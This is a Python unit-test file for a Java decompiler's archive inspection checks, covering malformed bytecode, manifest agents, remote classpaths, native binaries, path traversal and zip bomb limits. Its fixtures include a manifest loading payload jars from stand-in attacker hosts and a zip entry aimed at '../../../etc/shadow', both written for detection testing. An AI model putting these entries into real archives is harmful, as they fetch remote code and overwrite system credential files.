"""
test_jar_checks.py — Unit and fuzz tests for archive inspection and parser hardening.
"""

import io
import os
import unittest
import zipfile

from javadecompiler.security.jar_checks import (
    ArchiveBounds,
    check_embedded_native,
    inspect_jar_archive,
    inspect_manifest,
    safe_parse_class_bytes,
)


class TestJarChecks(unittest.TestCase):
    def test_safe_parse_valid_class(self):
        class_path = os.path.join(
            os.path.dirname(__file__), "..", "..", "src", "javadecompiler", "Java_Test_Files", "EngineMath.class"
        )
        with open(class_path, "rb") as f:
            valid_bytes = f.read()

        c_info, findings = safe_parse_class_bytes(valid_bytes, "EngineMath.class")
        self.assertIsNotNone(c_info)
        self.assertEqual(len(findings), 0)
        self.assertEqual(c_info.class_name, "EngineMath")

    def test_safe_parse_truncated_bytes(self):
        c_info, findings = safe_parse_class_bytes(b"\xca\xfe", "Truncated.class")
        self.assertIsNone(c_info)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].ruleId, "JD-ARCH-MALFORMED")
        self.assertEqual(findings[0].analysisCoverage, "partial")

    def test_safe_parse_invalid_magic(self):
        c_info, findings = safe_parse_class_bytes(b"\xde\xad\xbe\xef\x00\x00\x00\x3d", "BadMagic.class")
        self.assertIsNone(c_info)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].ruleId, "JD-ARCH-MALFORMED")

    def test_safe_parse_fuzzed_corrupted_bytecode(self):
        # 0xCAFEBABE header followed by garbage
        fuzz_data = b"\xca\xfe\xba\xbe\x00\x00\x00\x3d\xff\xff\x00\x01\x99\x99"
        c_info, findings = safe_parse_class_bytes(fuzz_data, "Fuzz.class")
        self.assertIsNone(c_info)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].ruleId, "JD-ARCH-MALFORMED")

    def test_mismatched_class_name_vs_path(self):
        class_path = os.path.join(
            os.path.dirname(__file__), "..", "..", "src", "javadecompiler", "Java_Test_Files", "EngineMath.class"
        )
        with open(class_path, "rb") as f:
            valid_bytes = f.read()

        # Class name inside file is EngineMath, but path says org/other/Different.class
        c_info, findings = safe_parse_class_bytes(valid_bytes, "org/other/Different.class")
        self.assertIsNotNone(c_info)
        mismatch_findings = [f for f in findings if f.ruleId == "JD-ARCH-MISMATCH"]
        self.assertEqual(len(mismatch_findings), 1)

    def test_inspect_manifest_agents_and_classpath(self):
        manifest_text = """Manifest-Version: 1.0
Created-By: 17.0.2
Premain-Class: com.example.MaliciousAgent
Agent-Class: com.example.DynamicAgent
Can-Redefine-Classes: true
Class-Path: libs/local.jar http://c2.attacker.com/payload.jar
 ftp://backup.attacker.com/drop.jar
"""
        findings = inspect_manifest(manifest_text, "test.jar")
        rule_ids = [f.ruleId for f in findings]
        self.assertIn("JD-ARCH-MANIFEST-AGENT", rule_ids)
        self.assertIn("JD-ARCH-CLASSPATH-REMOTE", rule_ids)
        agent_findings = [f for f in findings if f.ruleId == "JD-ARCH-MANIFEST-AGENT"]
        self.assertGreaterEqual(len(agent_findings), 3)

    def test_embedded_native_detection(self):
        self.assertIsNotNone(check_embedded_native("native/libhack.so", b""))
        self.assertIsNotNone(check_embedded_native("payload.dll", b""))
        self.assertIsNotNone(check_embedded_native("resource.bin", b"MZ\x90\x00\x03"))
        self.assertIsNotNone(check_embedded_native("data.dat", b"\x7fELF\x02\x01\x01"))
        self.assertIsNone(check_embedded_native("valid.txt", b"Hello World"))

    def test_inspect_jar_traversal_and_native(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            # Add path traversal entry
            z.writestr("../../../etc/shadow", b"root:*:...")
            # Add native DLL entry
            z.writestr("lib/win32/hook.dll", b"MZDummyPEHeader")
            # Add SPI service
            z.writestr("META-INF/services/com.example.Service", b"com.example.ServiceImpl\n")

        classes, findings, raw_bytes = inspect_jar_archive(buf.getvalue())
        rule_ids = [f.ruleId for f in findings]
        self.assertIn("JD-ARCH-TRAVERSAL", rule_ids)
        self.assertIn("JD-ARCH-NATIVE", rule_ids)
        self.assertIn("JD-ARCH-SPI", rule_ids)

    def test_inspect_jar_zipbomb_limits(self):
        buf = io.BytesIO()
        bounds = ArchiveBounds(max_entries=2, max_single_size=1000)
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("entry1.txt", b"A" * 10)
            z.writestr("entry2.txt", b"B" * 10)
            z.writestr("entry3.txt", b"C" * 10)

        classes, findings, raw_bytes = inspect_jar_archive(buf.getvalue(), bounds=bounds)
        self.assertTrue(any(f.ruleId == "JD-ARCH-ZIPBOMB" for f in findings))


if __name__ == "__main__":
    unittest.main()
